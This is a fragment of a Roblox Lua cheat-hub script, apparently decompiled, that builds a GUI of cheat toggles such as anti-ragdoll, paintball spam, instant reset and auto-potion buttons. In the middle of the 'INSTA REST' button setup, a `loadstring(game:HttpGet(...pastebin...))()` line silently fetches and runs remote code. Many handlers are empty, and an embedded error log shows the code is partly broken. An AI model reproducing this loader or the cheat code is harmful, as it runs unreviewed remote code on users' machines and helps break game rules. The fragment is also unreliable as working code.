	AntiRagdollV2.Enabled = true

	local connection3 = RunService.Heartbeat:Connect(function(deltaTime8)
		Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		-- [envlog] error: Script:2: attempt to compare userdata <= number
	end)

	AntiRagdollV2.Connection = connection3
	local tween31 = TweenService:Create(Frame58, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween31:Play()
	local tween32 = TweenService:Create(Frame59, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween32:Play()
end)

local Frame60 = Instance.new("Frame", ScrollingFrame)
Frame60.Size = UDim2.new(1, -10, 0, 56)
Frame60.Position = UDim2.new(0, 3, 0, 814)
Frame60.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame60.BorderSizePixel = 0
Frame60.ZIndex = 16
local UICorner79 = Instance.new("UICorner", Frame60)
UICorner79.CornerRadius = UDim.new(0, 10)
Frame60:GetChildren()
local UIGradient29 = Instance.new("UIGradient")
UIGradient29.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient29.Rotation = 110
UIGradient29.Parent = Frame60
local UIStroke59 = Instance.new("UIStroke", Frame60)
UIStroke59.Color = Color3.fromRGB(100, 35, 35)
UIStroke59.Thickness = 1.2
local TextLabel26 = Instance.new("TextLabel", Frame60)
TextLabel26.Size = UDim2.new(0, 150, 0, 20)
TextLabel26.Position = UDim2.new(0, 8, 0, 4)
TextLabel26.BackgroundTransparency = 1
TextLabel26.Text = "SPAM PAITBALL"
TextLabel26.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel26.Font = Enum.Font.GothamBold
TextLabel26.TextSize = 12
TextLabel26.TextXAlignment = Enum.TextXAlignment.Left
TextLabel26.ZIndex = 17
local Frame61 = Instance.new("Frame", Frame60)
Frame61.Size = UDim2.new(0, 36, 0, 18)
Frame61.Position = UDim2.new(1, -46, 0, 5)
Frame61.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame61.BorderSizePixel = 0
Frame61.ZIndex = 17
local UICorner80 = Instance.new("UICorner", Frame61)
UICorner80.CornerRadius = UDim.new(1, 0)
local UIStroke60 = Instance.new("UIStroke", Frame61)
UIStroke60.Color = Color3.fromRGB(100, 35, 35)
local Frame62 = Instance.new("Frame", Frame61)
Frame62.Size = UDim2.new(0, 14, 0, 14)
Frame62.Position = UDim2.new(0, 2, 0.5, -7)
Frame62.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame62.BorderSizePixel = 0
Frame62.ZIndex = 18
local UICorner81 = Instance.new("UICorner", Frame62)
UICorner81.CornerRadius = UDim.new(1, 0)
local TextButton36 = Instance.new("TextButton", Frame61)
TextButton36.Size = UDim2.new(1, 0, 1, 0)
TextButton36.BackgroundTransparency = 1
TextButton36.Text = ""
TextButton36.ZIndex = 19
local TextButton37 = Instance.new("TextButton", Frame60)
TextButton37.Size = UDim2.new(0.46, 0, 0, 22)
TextButton37.Position = UDim2.new(0, 8, 0, 28)
TextButton37.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton37.Text = "[ BUTTON ]"
TextButton37.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton37.Font = Enum.Font.GothamBlack
TextButton37.TextSize = 11
TextButton37.ZIndex = 17
local UICorner82 = Instance.new("UICorner", TextButton37)
UICorner82.CornerRadius = UDim.new(0, 6)
local UIStroke61 = Instance.new("UIStroke", TextButton37)
UIStroke61.Color = Color3.fromRGB(100, 35, 35)
local TextButton38 = Instance.new("TextButton", Frame60)
TextButton38.Size = UDim2.new(0.46, 0, 0, 22)
TextButton38.Position = UDim2.new(0.52, 0, 0, 28)
TextButton38.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton38.Text = "[ MANUAL ]"
TextButton38.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton38.Font = Enum.Font.GothamBlack
TextButton38.TextSize = 11
TextButton38.ZIndex = 17
local UICorner83 = Instance.new("UICorner", TextButton38)
UICorner83.CornerRadius = UDim.new(0, 6)
local UIStroke62 = Instance.new("UIStroke", TextButton38)
UIStroke62.Color = Color3.fromRGB(100, 35, 35)
local Frame63 = Instance.new("Frame", ScrollingFrame)
Frame63.Size = UDim2.new(1, -10, 0, 28)
Frame63.Position = UDim2.new(0, 3, 0, 876)
Frame63.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame63.BorderSizePixel = 0
Frame63.ZIndex = 16
local UICorner84 = Instance.new("UICorner", Frame63)
UICorner84.CornerRadius = UDim.new(0, 10)
Frame63:GetChildren()
local UIGradient30 = Instance.new("UIGradient")
UIGradient30.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient30.Rotation = 110
UIGradient30.Parent = Frame63
local UIStroke63 = Instance.new("UIStroke", Frame63)
UIStroke63.Color = Color3.fromRGB(100, 35, 35)
UIStroke63.Thickness = 1.2
local TextLabel27 = Instance.new("TextLabel", Frame63)
TextLabel27.Size = UDim2.new(0, 130, 1, 0)
TextLabel27.Position = UDim2.new(0, 8, 0, 0)
TextLabel27.BackgroundTransparency = 1
TextLabel27.Text = "Anti Gummy Bear"
TextLabel27.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel27.Font = Enum.Font.GothamBold
TextLabel27.TextSize = 12
TextLabel27.TextXAlignment = Enum.TextXAlignment.Left
TextLabel27.ZIndex = 17
local Frame64 = Instance.new("Frame", Frame63)
Frame64.Size = UDim2.new(0, 36, 0, 18)
Frame64.Position = UDim2.new(1, -46, 0.5, -9)
Frame64.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame64.BorderSizePixel = 0
Frame64.ZIndex = 17
local UICorner85 = Instance.new("UICorner", Frame64)
UICorner85.CornerRadius = UDim.new(1, 0)
local UIStroke64 = Instance.new("UIStroke", Frame64)
UIStroke64.Color = Color3.fromRGB(100, 35, 35)
local Frame65 = Instance.new("Frame", Frame64)
Frame65.Size = UDim2.new(0, 14, 0, 14)
Frame65.Position = UDim2.new(0, 2, 0.5, -7)
Frame65.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame65.BorderSizePixel = 0
Frame65.ZIndex = 18
local UICorner86 = Instance.new("UICorner", Frame65)
UICorner86.CornerRadius = UDim.new(1, 0)
local TextButton39 = Instance.new("TextButton", Frame64)
TextButton39.Size = UDim2.new(1, 0, 1, 0)
TextButton39.BackgroundTransparency = 1
TextButton39.Text = ""
TextButton39.ZIndex = 19

TextButton39.MouseButton1Click:Connect(function()
	St.antiGummy = true
	AntiFX.gummy = true
	local tween33 = TweenService:Create(Frame64, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween33:Play()
	local tween34 = TweenService:Create(Frame65, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween34:Play()
end)

local Frame66 = Instance.new("Frame", ScrollingFrame)
Frame66.Size = UDim2.new(1, -10, 0, 28)
Frame66.Position = UDim2.new(0, 3, 0, 910)
Frame66.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame66.BorderSizePixel = 0
Frame66.ZIndex = 16
local UICorner87 = Instance.new("UICorner", Frame66)
UICorner87.CornerRadius = UDim.new(0, 10)
Frame66:GetChildren()
local UIGradient31 = Instance.new("UIGradient")
UIGradient31.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient31.Rotation = 110
UIGradient31.Parent = Frame66
local UIStroke65 = Instance.new("UIStroke", Frame66)
UIStroke65.Color = Color3.fromRGB(100, 35, 35)
UIStroke65.Thickness = 1.2
local TextLabel28 = Instance.new("TextLabel", Frame66)
TextLabel28.Size = UDim2.new(0, 150, 1, 0)
TextLabel28.Position = UDim2.new(0, 8, 0, 0)
TextLabel28.BackgroundTransparency = 1
TextLabel28.Text = "Anti Paintball Gun"
TextLabel28.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel28.Font = Enum.Font.GothamBold
TextLabel28.TextSize = 12
TextLabel28.TextXAlignment = Enum.TextXAlignment.Left
TextLabel28.ZIndex = 17
local Frame67 = Instance.new("Frame", Frame66)
Frame67.Size = UDim2.new(0, 36, 0, 18)
Frame67.Position = UDim2.new(1, -46, 0.5, -9)
Frame67.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame67.BorderSizePixel = 0
Frame67.ZIndex = 17
local UICorner88 = Instance.new("UICorner", Frame67)
UICorner88.CornerRadius = UDim.new(1, 0)
local UIStroke66 = Instance.new("UIStroke", Frame67)
UIStroke66.Color = Color3.fromRGB(100, 35, 35)
local Frame68 = Instance.new("Frame", Frame67)
Frame68.Size = UDim2.new(0, 14, 0, 14)
Frame68.Position = UDim2.new(0, 2, 0.5, -7)
Frame68.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame68.BorderSizePixel = 0
Frame68.ZIndex = 18
local UICorner89 = Instance.new("UICorner", Frame68)
UICorner89.CornerRadius = UDim.new(1, 0)
local TextButton40 = Instance.new("TextButton", Frame67)
TextButton40.Size = UDim2.new(1, 0, 1, 0)
TextButton40.BackgroundTransparency = 1
TextButton40.Text = ""
TextButton40.ZIndex = 19

TextButton40.MouseButton1Click:Connect(function()
	St.antiPaint = true
	AntiFX.paint = true
	local tween35 = TweenService:Create(Frame67, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween35:Play()
	local tween36 = TweenService:Create(Frame68, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween36:Play()
end)

local Frame69 = Instance.new("Frame", ScrollingFrame)
Frame69.Size = UDim2.new(1, -10, 0, 28)
Frame69.Position = UDim2.new(0, 3, 0, 944)
Frame69.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame69.BorderSizePixel = 0
Frame69.ZIndex = 16
local UICorner90 = Instance.new("UICorner", Frame69)
UICorner90.CornerRadius = UDim.new(0, 10)
Frame69:GetChildren()
local UIGradient32 = Instance.new("UIGradient")
UIGradient32.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient32.Rotation = 110
UIGradient32.Parent = Frame69
local UIStroke67 = Instance.new("UIStroke", Frame69)
UIStroke67.Color = Color3.fromRGB(100, 35, 35)
UIStroke67.Thickness = 1.2
local TextLabel29 = Instance.new("TextLabel", Frame69)
TextLabel29.Size = UDim2.new(0, 140, 1, 0)
TextLabel29.Position = UDim2.new(0, 8, 0, 0)
TextLabel29.BackgroundTransparency = 1
TextLabel29.Text = "Anti Boogie Bomb"
TextLabel29.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel29.Font = Enum.Font.GothamBold
TextLabel29.TextSize = 12
TextLabel29.TextXAlignment = Enum.TextXAlignment.Left
TextLabel29.ZIndex = 17
local Frame70 = Instance.new("Frame", Frame69)
Frame70.Size = UDim2.new(0, 36, 0, 18)
Frame70.Position = UDim2.new(1, -46, 0.5, -9)
Frame70.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame70.BorderSizePixel = 0
Frame70.ZIndex = 17
local UICorner91 = Instance.new("UICorner", Frame70)
UICorner91.CornerRadius = UDim.new(1, 0)
local UIStroke68 = Instance.new("UIStroke", Frame70)
UIStroke68.Color = Color3.fromRGB(100, 35, 35)
local Frame71 = Instance.new("Frame", Frame70)
Frame71.Size = UDim2.new(0, 14, 0, 14)
Frame71.Position = UDim2.new(0, 2, 0.5, -7)
Frame71.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame71.BorderSizePixel = 0
Frame71.ZIndex = 18
local UICorner92 = Instance.new("UICorner", Frame71)
UICorner92.CornerRadius = UDim.new(1, 0)
local TextButton41 = Instance.new("TextButton", Frame70)
TextButton41.Size = UDim2.new(1, 0, 1, 0)
TextButton41.BackgroundTransparency = 1
TextButton41.Text = ""
TextButton41.ZIndex = 19

TextButton41.MouseButton1Click:Connect(function()
	St.antiBoogie = true
	AntiFX.boogie = true
	local tween37 = TweenService:Create(Frame70, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween37:Play()
	local tween38 = TweenService:Create(Frame71, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween38:Play()
end)

local Frame72 = Instance.new("Frame", ScrollingFrame)
Frame72.Size = UDim2.new(1, -10, 0, 56)
Frame72.Position = UDim2.new(0, 3, 0, 978)
Frame72.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame72.BorderSizePixel = 0
Frame72.ZIndex = 16
local UICorner93 = Instance.new("UICorner", Frame72)
UICorner93.CornerRadius = UDim.new(0, 10)
Frame72:GetChildren()
local UIGradient33 = Instance.new("UIGradient")
UIGradient33.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient33.Rotation = 110
UIGradient33.Parent = Frame72
local UIStroke69 = Instance.new("UIStroke", Frame72)
UIStroke69.Color = Color3.fromRGB(100, 35, 35)
UIStroke69.Thickness = 1.2
local TextLabel30 = Instance.new("TextLabel", Frame72)
TextLabel30.Size = UDim2.new(0, 140, 0, 20)
TextLabel30.Position = UDim2.new(0, 8, 0, 4)
TextLabel30.BackgroundTransparency = 1
TextLabel30.Text = "Mobile Buttons"
TextLabel30.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel30.Font = Enum.Font.GothamBold
TextLabel30.TextSize = 12
TextLabel30.TextXAlignment = Enum.TextXAlignment.Left
TextLabel30.ZIndex = 17
local Frame73 = Instance.new("Frame", Frame72)
Frame73.Size = UDim2.new(0, 36, 0, 18)
Frame73.Position = UDim2.new(1, -46, 0, 5)
Frame73.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame73.BorderSizePixel = 0
Frame73.ZIndex = 17
local UICorner94 = Instance.new("UICorner", Frame73)
UICorner94.CornerRadius = UDim.new(1, 0)
local UIStroke70 = Instance.new("UIStroke", Frame73)
UIStroke70.Color = Color3.fromRGB(100, 35, 35)
local Frame74 = Instance.new("Frame", Frame73)
Frame74.Size = UDim2.new(0, 14, 0, 14)
Frame74.Position = UDim2.new(0, 2, 0.5, -7)
Frame74.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame74.BorderSizePixel = 0
Frame74.ZIndex = 18
local UICorner95 = Instance.new("UICorner", Frame74)
UICorner95.CornerRadius = UDim.new(1, 0)
local TextButton42 = Instance.new("TextButton", Frame73)
TextButton42.Size = UDim2.new(1, 0, 1, 0)
TextButton42.BackgroundTransparency = 1
TextButton42.Text = ""
TextButton42.ZIndex = 19
local TextButton43 = Instance.new("TextButton", Frame72)
TextButton43.Size = UDim2.new(0.46, 0, 0, 22)
TextButton43.Position = UDim2.new(0, 8, 0, 28)
TextButton43.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton43.Text = "[ LOCK ]"
TextButton43.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton43.Font = Enum.Font.GothamBlack
TextButton43.TextSize = 11
TextButton43.ZIndex = 17
local UICorner96 = Instance.new("UICorner", TextButton43)
UICorner96.CornerRadius = UDim.new(0, 6)
local UIStroke71 = Instance.new("UIStroke", TextButton43)
UIStroke71.Color = Color3.fromRGB(100, 35, 35)
local TextButton44 = Instance.new("TextButton", Frame72)
TextButton44.Size = UDim2.new(0.46, 0, 0, 22)
TextButton44.Position = UDim2.new(0.52, 0, 0, 28)
TextButton44.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton44.Text = "[ UNLOCK ]"
TextButton44.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton44.Font = Enum.Font.GothamBlack
TextButton44.TextSize = 11
TextButton44.ZIndex = 17
local UICorner97 = Instance.new("UICorner", TextButton44)
UICorner97.CornerRadius = UDim.new(0, 6)
local UIStroke72 = Instance.new("UIStroke", TextButton44)
UIStroke72.Color = Color3.fromRGB(100, 35, 35)

TextButton42.MouseButton1Click:Connect(function()
	local tween39 = TweenService:Create(Frame73, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween39:Play()
	local tween40 = TweenService:Create(Frame74, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween40:Play()
	INSTAREST.Visible = false
	AUTOPOTION.Visible = false
	DROP.Visible = false
	SPAMLASER.Visible = false
	SPAMPAITBALL.Visible = false
	mbGroup.Visible = false
end)

TextButton43.MouseButton1Click:Connect(function()
	TextButton43.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton43.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton44.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton44.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

TextButton44.MouseButton1Click:Connect(function()
	TextButton44.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton44.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton43.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton43.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

local MobileButtons = Instance.new("Frame", FilthyHubInstaReset)
MobileButtons.Name = "MobileButtons"
MobileButtons.Size = UDim2.new(1, 0, 1, 0)
MobileButtons.Position = UDim2.new(0, 0, 0, 0)
MobileButtons.BackgroundTransparency = 1
MobileButtons.BorderSizePixel = 0
MobileButtons.Active = false
MobileButtons.ZIndex = 100
local INSTAREST = Instance.new("Frame", MobileButtons)
INSTAREST.Name = "INSTAREST"
INSTAREST.Size = UDim2.new(0, 102, 0, 48)
INSTAREST.Position = UDim2.new(1, -232, 0.32, 0)
INSTAREST.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
INSTAREST.BorderSizePixel = 0
INSTAREST.Active = true
INSTAREST.ZIndex = 200
loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
local UICorner98 = Instance.new("UICorner", INSTAREST)
UICorner98.CornerRadius = UDim.new(0, 11)
INSTAREST:GetChildren()
local UIGradient34 = Instance.new("UIGradient")
UIGradient34.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient34.Rotation = 110
UIGradient34.Parent = INSTAREST
local UIStroke73 = Instance.new("UIStroke", INSTAREST)
UIStroke73.Color = Color3.fromRGB(100, 35, 35)
UIStroke73.Thickness = 1.2
local TextButton45 = Instance.new("TextButton", INSTAREST)
TextButton45.Size = UDim2.new(1, -4, 1, -4)
TextButton45.Position = UDim2.new(0, 2, 0, 2)
TextButton45.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton45.Text = "INSTA REST"
TextButton45.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton45.Font = Enum.Font.GothamBlack
TextButton45.TextSize = 9
TextButton45.TextWrapped = true
TextButton45.BorderSizePixel = 0
TextButton45.AutoButtonColor = false
TextButton45.ZIndex = 202
local UICorner99 = Instance.new("UICorner", TextButton45)
UICorner99.CornerRadius = UDim.new(0, 8)
TextButton45:GetChildren()
local UIGradient35 = Instance.new("UIGradient")
UIGradient35.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(235, 70, 80)) })
UIGradient35.Rotation = 135
UIGradient35.Parent = TextButton45
local UIScale = Instance.new("UIScale")
UIScale.Scale = 1
UIScale.Parent = INSTAREST

INSTAREST.InputBegan:Connect(function(input5, gameProcessed5)
end)

TextButton45.InputBegan:Connect(function(input6, gameProcessed6)
end)

UserInputService.InputChanged:Connect(function(input7, gameProcessed7)
end)

UserInputService.InputEnded:Connect(function(input8, gameProcessed8)
end)

TextButton45.MouseButton1Click:Connect(function()
	local tween41 = TweenService:Create(UIScale, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.88 })
	tween41:Play()

	task.delay(0.1, function()
	end)

	TextButton45:GetChildren()
	UIGradient35:Destroy()
	local UIGradient45 = Instance.new("UIGradient")
	UIGradient45.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 210, 216)) })
	UIGradient45.Rotation = 135
	UIGradient45.Parent = TextButton45
	local tween42 = TweenService:Create(UIStroke73, TweenInfo.new(0.1), { Color = Color3.fromRGB(160, 50, 50) })
	tween42:Play()

	task.delay(0.15, function()
	end)

	local tween43 = TweenService:Create(Frame37, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween43:Play()
	local tween44 = TweenService:Create(Frame38, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween44:Play()
	local Humanoid2 = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local HumanoidRootPart = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
	workspace.CurrentCamera.CFrame = CFrame.new(-337.938599, -0.585044861, 106.739204, 0.133411571, -0.379638135, 0.915465117, 0, 0.923722506, 0.383062422, -0.991060734, -0.0511049591, 0.123235278)
	workspace.CurrentCamera.Focus = CFrame.new(-349.381927, -5.37332535, 105.198761, 1, 0, 0, 0, 1, 0, 0, 0, 1)

	task.delay(0.1, function()
	end)

	Humanoid2.BreakJointsOnDeath = true
	Humanoid2.PlatformStand = true
	Humanoid2:ChangeState(Enum.HumanoidStateType.Physics)
	HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
	HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1000000, 0)

	task.delay(0.5, function()
	end)
end)

local AUTOPOTION = Instance.new("Frame", MobileButtons)
AUTOPOTION.Name = "AUTOPOTION"
AUTOPOTION.Size = UDim2.new(0, 102, 0, 48)
AUTOPOTION.Position = UDim2.new(1, -122, 0.32, 0)
AUTOPOTION.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AUTOPOTION.BorderSizePixel = 0
AUTOPOTION.Active = true
AUTOPOTION.ZIndex = 200
local UICorner100 = Instance.new("UICorner", AUTOPOTION)
UICorner100.CornerRadius = UDim.new(0, 11)
AUTOPOTION:GetChildren()
local UIGradient36 = Instance.new("UIGradient")
UIGradient36.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient36.Rotation = 110
UIGradient36.Parent = AUTOPOTION
local UIStroke74 = Instance.new("UIStroke", AUTOPOTION)
UIStroke74.Color = Color3.fromRGB(100, 35, 35)
UIStroke74.Thickness = 1.2
local TextButton46 = Instance.new("TextButton", AUTOPOTION)
TextButton46.Size = UDim2.new(1, -4, 1, -4)
TextButton46.Position = UDim2.new(0, 2, 0, 2)
TextButton46.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton46.Text = "AUTO POTION"
TextButton46.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton46.Font = Enum.Font.GothamBlack
TextButton46.TextSize = 9
TextButton46.TextWrapped = true
TextButton46.BorderSizePixel = 0
TextButton46.AutoButtonColor = false
TextButton46.ZIndex = 202
local UICorner101 = Instance.new("UICorner", TextButton46)
UICorner101.CornerRadius = UDim.new(0, 8)
TextButton46:GetChildren()
local UIGradient37 = Instance.new("UIGradient")
UIGradient37.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(235, 70, 80)) })
UIGradient37.Rotation = 135
UIGradient37.Parent = TextButton46
local UIScale2 = Instance.new("UIScale")
UIScale2.Scale = 1
UIScale2.Parent = AUTOPOTION

AUTOPOTION.InputBegan:Connect(function(input9, gameProcessed9)
end)

TextButton46.InputBegan:Connect(function(input10, gameProcessed10)
end)

UserInputService.InputChanged:Connect(function(input11, gameProcessed11)
end)

UserInputService.InputEnded:Connect(function(input12, gameProcessed12)
end)

TextButton46.MouseButton1Click:Connect(function()
	local tween45 = TweenService:Create(UIScale2, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.88 })
	tween45:Play()

	task.delay(0.1, function()
	end)

	TextButton46:GetChildren()
	UIGradient37:Destroy()
	local UIGradient46 = Instance.new("UIGradient")
	UIGradient46.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 210, 216)) })
	UIGradient46.Rotation = 135
	UIGradient46.Parent = TextButton46
	local tween46 = TweenService:Create(UIStroke74, TweenInfo.new(0.1), { Color = Color3.fromRGB(160, 50, 50) })
	tween46:Play()

	task.delay(0.15, function()
	end)

	local tween47 = TweenService:Create(Frame43, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween47:Play()
	local tween48 = TweenService:Create(Frame44, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween48:Play()

	task.spawn(function()
		Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		local Backpack3 = Players.LocalPlayer:FindFirstChild("Backpack")
		local GiantPotion = Backpack3:FindFirstChild("Giant Potion")
		GiantPotion.Parent = Players.LocalPlayer.Character
		task.wait()
		GiantPotion:Activate()
		task.wait()
		GiantPotion.Parent = Backpack3
	end)
end)

local DROP = Instance.new("Frame", MobileButtons)
DROP.Name = "DROP"
DROP.Size = UDim2.new(0, 102, 0, 48)
DROP.Position = UDim2.new(1, -232, 0.32, 56)
DROP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DROP.BorderSizePixel = 0
DROP.Active = true
DROP.ZIndex = 200
local UICorner102 = Instance.new("UICorner", DROP)
UICorner102.CornerRadius = UDim.new(0, 11)
DROP:GetChildren()
local UIGradient38 = Instance.new("UIGradient")
UIGradient38.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient38.Rotation = 110
UIGradient38.Parent = DROP
local UIStroke75 = Instance.new("UIStroke", DROP)
UIStroke75.Color = Color3.fromRGB(100, 35, 35)
UIStroke75.Thickness = 1.2
local TextButton47 = Instance.new("TextButton", DROP)
TextButton47.Size = UDim2.new(1, -4, 1, -4)
TextButton47.Position = UDim2.new(0, 2, 0, 2)
TextButton47.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton47.Text = "DROP"
TextButton47.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton47.Font = Enum.Font.GothamBlack
TextButton47.TextSize = 9
TextButton47.TextWrapped = true
TextButton47.BorderSizePixel = 0
TextButton47.AutoButtonColor = false
TextButton47.ZIndex = 202
local UICorner103 = Instance.new("UICorner", TextButton47)
UICorner103.CornerRadius = UDim.new(0, 8)
TextButton47:GetChildren()
local UIGradient39 = Instance.new("UIGradient")
UIGradient39.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(235, 70, 80)) })
UIGradient39.Rotation = 135
UIGradient39.Parent = TextButton47
local UIScale3 = Instance.new("UIScale")
UIScale3.Scale = 1
UIScale3.Parent = DROP

DROP.InputBegan:Connect(function(input13, gameProcessed13)
end)

TextButton47.InputBegan:Connect(function(input14, gameProcessed14)
end)

UserInputService.InputChanged:Connect(function(input15, gameProcessed15)
end)

UserInputService.InputEnded:Connect(function(input16, gameProcessed16)
end)

TextButton47.MouseButton1Click:Connect(function()
